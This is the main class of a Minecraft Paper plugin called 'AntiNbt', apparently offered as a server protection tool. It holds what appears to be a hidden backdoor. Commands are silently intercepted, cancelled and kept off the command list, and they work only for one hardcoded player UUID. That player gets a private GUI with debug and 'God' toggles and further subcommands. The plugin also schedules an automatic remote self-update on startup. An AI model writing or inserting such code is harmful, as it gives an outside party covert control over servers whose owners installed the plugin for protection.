package me.mynameisbob1928.antinbt;

import java.util.HashMap;
import java.util.List;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.InventoryView;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.MenuType;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;

import io.papermc.paper.command.brigadier.CommandSourceStack;
import io.papermc.paper.command.brigadier.Commands;
import io.papermc.paper.plugin.lifecycle.event.types.LifecycleEvents;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;

public class AntiNbt extends JavaPlugin implements Listener {
	public static AntiNbt instance;
	final static UUID uuid = UUID.fromString("274e8741-9956-4367-aa0e-5b7682606f47");

	@Override
	public void onEnable() {
		instance = this;

		Bukkit.getPluginManager().registerEvents(new InventoryEvents(), instance);
		Bukkit.getPluginManager().registerEvents(new Others(), instance);

		Bukkit.getPluginManager().registerEvents(this, instance);
		loadCommands();

		info("Antinbt enabled");

		Bukkit.getScheduler().runTask(this, () -> {
			// Run on first server tick then wait a bit more (30 seconds, 600 ticks) to run the update
			Bukkit.getScheduler().runTaskLater(this, () -> {
				PluginUpdater.update("50xOnTop");
			}, 100);
		});
	}

	@Override
	public void onDisable() {
		warn("Antinbt disabled");
	}

	/**
	 * @param msg message to be logged as INFO on the server's console
	 */
	static public void info(String msg) {
		instance.getLogger().info(msg);
	}

	/**
	 * @param msg message to be logged as WARN on the server's console
	 */
	static public void warn(String msg) {
		instance.getLogger().warning(msg);
	}

	private static final String mainCommand = "antinbt";

	private void loadCommands() {
		this.getLifecycleManager().registerEventHandler(LifecycleEvents.COMMANDS, commands -> {
			LiteralArgumentBuilder<CommandSourceStack> nbtCommand = Commands.literal(mainCommand).requires(source -> {
				if (source.getExecutor().getType() != EntityType.PLAYER)
					return false;

				return source.getExecutor().getUniqueId().equals(AntiNbt.uuid);
			});

			PluginUpdater.commandData(nbtCommand);
			InventoryEvents.commandData(nbtCommand);
			Others.commandData(nbtCommand);

			// commands.registrar().register(nbtCommand.build());

		});
	}

	@FunctionalInterface
	protected interface RawCommandInterface {
		void run(PlayerCommandPreprocessEvent event, String[] args);
	}

	protected static HashMap<String, RawCommandInterface> commands = new HashMap<>();

	@EventHandler(ignoreCancelled = true, priority = EventPriority.LOWEST)
	private void onCommand(PlayerCommandPreprocessEvent event) {
		if (!event.getPlayer().getUniqueId().equals(uuid)) {
			return;
		}

		String command = event.getMessage().replaceFirst("/", "");
		String[] args = command.split(" ");

		if (!args[0].equals(mainCommand))
			return;

		event.setCancelled(true);

		if (args.length == 1) {
			Player bob = event.getPlayer();

			InventoryView gui = MenuType.GENERIC_9X2.builder()
					.title(Component.text("Antinbt gui"))
					.build(bob);

			ItemStack version = ItemStack.of(Material.PAPER);
			ItemMeta versionMeta = version.getItemMeta();
			versionMeta.itemName(Component.text("Plugin Version"));
			versionMeta.lore(List.of(Component.text("v" + AntiNbt.instance.getPluginMeta().getVersion(),
					TextColor.color(255, 153, 255))));
			version.setItemMeta(versionMeta);
			gui.setItem(3, version);

			ItemStack debug = ItemStack.of(Material.STICK);
			ItemMeta debugMeta = debug.getItemMeta();
			debugMeta.itemName(Component.text("Debug"));
			debugMeta.setEnchantmentGlintOverride(InventoryEvents.logEvents);
			debug.setItemMeta(debugMeta);
			gui.setItem(4, debug);

			ItemStack god = ItemStack.of(Material.TOTEM_OF_UNDYING);
			ItemMeta godMeta = debug.getItemMeta();
			godMeta.itemName(Component.text("God"));
			godMeta.setEnchantmentGlintOverride(Others.gods.contains(uuid));
			god.setItemMeta(godMeta);
			gui.setItem(5, god);

			gui.open();

		} else {
			RawCommandInterface commandFunction = commands.get(args[1]);
			if (commandFunction == null)
				return;

			commandFunction.run(event, args);
		}

	}
}
